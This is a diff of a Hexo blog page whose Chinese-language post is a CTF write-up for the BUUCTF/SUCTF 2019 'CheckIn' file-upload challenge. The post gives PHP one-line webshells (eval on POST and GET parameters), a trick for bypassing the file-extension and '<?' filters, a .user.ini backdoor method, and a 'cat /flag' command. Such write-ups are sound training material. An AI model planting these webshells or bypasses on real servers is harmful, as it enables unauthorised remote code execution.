@@ -7,7 +7,7 @@
 
 <html class="theme-next gemini use-motion" lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
@@ -101,13 +101,13 @@
 
 
 
-<meta name="description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script">
+<meta name="description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF-CheckIn">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;25&#x2F;BUUCTF-CheckIn&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script">
+<meta property="og:description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;CheckIn&#x2F;0.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;CheckIn&#x2F;1.png">
@@ -149,7 +149,7 @@
 
 
 
-  <title>BUUCTF-CheckIn | diao-diao-UPUP</title>
+  <title>BUUCTF-CheckIn | diao-diao-UPUP</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
@@ -168,7 +168,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -413,9 +413,7 @@
         <h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>打开环境看到是一个上传的界面 难道是一句话木马</p>
 <p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
 <p>所以尝试在.php后加一个空格 再.png 成功上传</p>
-<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
+<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
 <ol>
 <li><p>.user.ini文件 <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
@@ -427,9 +425,7 @@
 <p><img src="/images/BUUCTF/CheckIn/1.png" alt="avatar"></p>
 <p>接下来用菜刀getshell</p>
 <p>得到flag</p>
-<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>URL：<br>?a=system(“cat /flag”);</p>
+<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>URL：<br>?a=system(“cat /flag”);</p>
 <p>也可以得到flag</p>
 <p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
 
@@ -555,7 +551,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1157,6 +1153,8 @@
   
 
   
+  
+
 
   
 
@@ -1164,7 +1162,7 @@
 
   
   <!-- 页面点击小红心 -->
-<script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script type="text/javascript" src="/js/src/clicklove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </body>
 </html>
